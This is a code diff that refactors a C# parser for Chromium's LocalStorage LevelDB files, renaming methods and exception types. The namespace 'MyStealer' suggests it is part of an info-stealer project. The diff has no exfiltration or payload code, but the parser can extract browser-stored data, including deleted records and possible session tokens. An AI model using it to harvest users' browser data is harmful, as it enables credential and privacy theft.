@@ -39,7 +39,6 @@ using MyStealer.Utils.Chromium;
 /// </summary>
 public static class CclChromiumLocalStorage
 {
-
     /// <summary>
     /// See: https://source.chromium.org/chromium/chromium/src/+/main:components/services/storage/dom_storage/local_storage_impl.cc
     /// Meta keys:
@@ -101,12 +100,12 @@ public static class CclChromiumLocalStorage
                 // This is a simple protobuff, so we'll read it directly, but with checks, rather than add a dependency
                 var ts_tag = stream.ReadVarInt();
                 if ((ts_tag & 0x07) != 0 || ts_tag >> 3 != 1)
-                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");
+                    throw new DbFormatException("Unexpected tag when reading StorageMetadata from protobuff");
 
                 var timestamp = ChromiumTimeStamp.ToUtc(stream.ReadVarInt());
                 var size_tag = stream.ReadVarInt();
                 if ((size_tag & 0x07) != 0 || size_tag >> 3 != 2)
-                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");
+                    throw new DbFormatException("Unexpected tag when reading StorageMetadata from protobuff");
 
                 var size = stream.ReadVarInt();
                 return new StorageMetadata(storageKey, timestamp, size, seq);
@@ -180,8 +179,8 @@ public static class CclChromiumLocalStorage
 
             ldb = new RawLevelDb(in_dir);
 
-            var storageDetails = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
-            var flatItems = ImmutableList.CreateBuilder<StorageEntry>();
+            var storagedetails = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
+            var flatitems = ImmutableList.CreateBuilder<StorageEntry>();
             var records = new Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>>();
 
             foreach (var record in ldb)
@@ -190,12 +189,12 @@ public static class CclChromiumLocalStorage
                 {
                     var metaLen = _META_PREFIX.Length;
                     storage_key = Encoding.Default.GetString(record.UserKey, metaLen, record.UserKey.Length - metaLen);
-                    if (!storageDetails.ContainsKey(storage_key))
-                        storageDetails[storage_key] = new Dictionary<ulong, StorageMetadata>();
+                    if (!storagedetails.ContainsKey(storage_key))
+                        storagedetails[storage_key] = new Dictionary<ulong, StorageMetadata>();
 
                     var metadata = StorageMetadata.FromProtobuff(storage_key, record.Value, record.Seq);
-                    storageDetails[storage_key][record.Seq] = metadata;
-                    flatItems.Add(metadata);
+                    storagedetails[storage_key][record.Seq] = metadata;
+                    flatitems.Add(metadata);
                 }
                 else if (record.UserKey.Length > 0 && record.UserKey[0] == _RECORD_KEY_PREFIX)
                 {
@@ -222,14 +221,14 @@ public static class CclChromiumLocalStorage
 
                     var ls_record = new LocalStorageRecord(storage_key, script_key, value, record.Seq, record.State == KeyState.Live);
                     records[storage_key][script_key][record.Seq] = ls_record;
-                    flatItems.Add(ls_record);
+                    flatitems.Add(ls_record);
                 }
             }
-            this.storageDetails = storageDetails.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<ulong, StorageMetadata>)e.Value.ToImmutableDictionary());
+            this.storageDetails = storagedetails.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<ulong, StorageMetadata>)e.Value.ToImmutableDictionary());
             this.records = records.ToImmutableDictionary(e => e.Key, e => (IImmutableDictionary<string, IImmutableDictionary<ulong, LocalStorageRecord>>)e.Value.ToImmutableDictionary(f => f.Key, f => (IImmutableDictionary<ulong, LocalStorageRecord>)f.Value.ToImmutableDictionary()));
-            allStorageKeys = storageDetails.Keys.Concat(records.Keys).ToImmutableHashSet();
-            flatItems.Sort((a, b) => a.Seq.CompareTo(b.Seq));
-            this.flatItems = flatItems.ToImmutable();
+            allStorageKeys = storagedetails.Keys.Concat(records.Keys).ToImmutableHashSet();
+            flatitems.Sort((a, b) => a.Seq.CompareTo(b.Seq));
+            this.flatItems = flatitems.ToImmutable();
 
             // organise batches - this is made complex and slow by having to account for missing/deleted data
             // we're looking for a StorageMetadata followed by sequential (in terms of seq number) LocalStorageRecords
@@ -238,7 +237,7 @@ public static class CclChromiumLocalStorage
             var batches = ImmutableDictionary.CreateBuilder<ulong, LocalStorageBatch>();
             StorageMetadata current_meta = null;
             var current_end = 0UL;
-            foreach (var item in flatItems)
+            foreach (var item in flatitems)
             {
                 // pre-sorted
                 if (item is LocalStorageRecord)
@@ -246,7 +245,6 @@ public static class CclChromiumLocalStorage
                     if (current_meta is null)
                     {
                         // no currently valid metadata so we can't attribute this record to anything
-                        continue;
                     }
                     else if (item.Seq - current_end != 1 || item.StorageKey != current_meta.StorageKey)
                     {
@@ -261,19 +259,20 @@ public static class CclChromiumLocalStorage
                         current_end = item.Seq;
                     }
                 }
-                else if (item is StorageMetadata)
+                else if (item is StorageMetadata meta)
                 {
                     if (current_meta != null)
                     {
                         // this record breaks a chain, so bundle up what we have, set new start
                         batches[current_meta.Seq] = new LocalStorageBatch(current_meta, current_end);
                     }
-                    current_meta = (StorageMetadata)item;
+
+                    current_meta = meta;
                     current_end = item.Seq;
                 }
                 else
                 {
-                    throw new Exception("Unknown item: " + item);
+                    throw new DbFormatException("Unknown db item: " + item);
                 }
             }
             if (current_meta != null)
@@ -336,7 +335,7 @@ public static class CclChromiumLocalStorage
         //         (these will have None as values).
         //         :return: iterable of LocalStorageRecords
         //         
-        public virtual IEnumerable<LocalStorageRecord> iter_all_records(bool include_deletions = false)
+        public virtual IEnumerable<LocalStorageRecord> EnumerateRecords(bool includeDeleted = false)
         {
             foreach (var scriptDict in records)
             {
@@ -344,7 +343,7 @@ public static class CclChromiumLocalStorage
                 {
                     foreach (var value in seqDict.Value.Values)
                     {
-                        if (value.IsLive || include_deletions)
+                        if (value.IsLive || includeDeleted)
                             yield return value;
                     }
                 }
@@ -357,7 +356,7 @@ public static class CclChromiumLocalStorage
         //         (these will have None as values).
         //         :return: iterable of LocalStorageRecords
         //         
-        public virtual IEnumerable<LocalStorageRecord> iter_records_for_storage_key(string storage_key, bool include_deletions = false)
+        public virtual IEnumerable<LocalStorageRecord> EnumerateRecords(string storage_key, bool include_deletions = false)
         {
             if (!ContainsStorageKey(storage_key))
                 throw new KeyNotFoundException(storage_key);
@@ -377,7 +376,7 @@ public static class CclChromiumLocalStorage
         //         :param script_key: script defined key for the records
         //         :return: iterable of LocalStorageRecords
         //         
-        public virtual IEnumerable<LocalStorageRecord> iter_records_for_script_key(string storage_key, string script_key, bool include_deletions = false)
+        public virtual IEnumerable<LocalStorageRecord> EnumerateRecords(string storage_key, string script_key, bool include_deletions = false)
         {
             if (!ContainsScriptKey(storage_key, script_key))
                 throw new KeyNotFoundException("storage_key: " + storage_key + " script_key: " + script_key);
@@ -392,7 +391,7 @@ public static class CclChromiumLocalStorage
         // 
         //         :return: iterable of StorageMetaData
         //         
-        public virtual IEnumerable<StorageMetadata> iter_metadata()
+        public virtual IEnumerable<StorageMetadata> EnumerateMetadatas()
         {
             foreach (var meta in flatItems)
             {
@@ -405,7 +404,7 @@ public static class CclChromiumLocalStorage
         //         :param storage_key: storage key (host) for the metadata
         //         :return: iterable of StorageMetadata
         //         
-        public virtual IEnumerable<StorageMetadata> iter_metadata_for_storage_key(string storage_key)
+        public virtual IEnumerable<StorageMetadata> EnumerateMetadatas(string storage_key)
         {
             if (!allStorageKeys.Contains(storage_key))
                 throw new KeyNotFoundException(storage_key);
@@ -417,12 +416,12 @@ public static class CclChromiumLocalStorage
                 yield return meta;
         }
 
-        public virtual IEnumerable<KeyValuePair<ulong, LocalStorageBatch>> iter_batches()
+        public virtual IEnumerable<KeyValuePair<ulong, LocalStorageBatch>> EnumerateBatches()
         {
             foreach (var batch in batches)
                 yield return batch;
         }
 
-        public void Dispose() => ((IDisposable)ldb).Dispose();
+        public void Dispose() => ldb.Dispose();
     }
 }
